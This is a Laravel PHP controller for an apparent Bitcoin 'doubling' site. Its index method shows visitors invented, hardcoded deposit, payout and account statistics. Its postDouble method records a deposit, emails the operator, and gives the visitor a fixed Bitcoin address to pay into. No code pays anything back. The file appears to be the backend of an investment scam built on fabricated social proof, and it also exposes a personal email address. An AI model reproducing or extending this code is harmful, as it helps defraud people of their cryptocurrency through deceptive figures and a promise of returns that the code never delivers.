<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use App\Deposits;
use App\Payouts;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function index()
    {
    	$totalDeposit = "12449.1245786542";
        $totalPayout = "104641.54678413";
        $totalPayoutTransactions = "2045137";
        $totalDepositAccounts = "226312";
    	$latestDeposits = $this->helpers->getLatestDeposits();
        $latestPayouts = $this->helpers->getLatestPayouts();
        
    	return view('index', compact(['latestDeposits', 'latestPayouts','totalDepositAccounts', 'totalPayoutTransactions', 'totalDeposit', 'totalPayout']));
    }
    
    
    public function postDouble(Request $request)
	{
           $req = $request->all();
          # dd($req);
               
                $validator = Validator::make($req, [
                             'amount' => 'required',
                             'wallet_address' => 'required'
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                      //dd($messages);
             
                      return redirect()->back()->withInput()->with('errors',$messages);
                 }
                
                 else
                 { 
                     $wallet = "1NnqMhCiss4AChv7WJ9qR4dfJrPY6tUcRE";              	
                     $arr = ['amount' => $req['amount'], 'wallet' => $req['wallet_address'], 'status' => "pending"];
                     $this->helpers->addDeposit($arr);
                     
                 	$this->helpers->sendEmail("kudayisitobi@gmail.com" ,"Client Just Deposited Bitcoin",['arr' => $arr],'emails.deposit_alert','view');
                     Session::flash("deposit-status", "success");
                     Session::flash("amount", $req['amount']);
                     Session::flash("wallet", $wallet);
                     return redirect()->intended('/');                           
                 }
                                       
	}

}
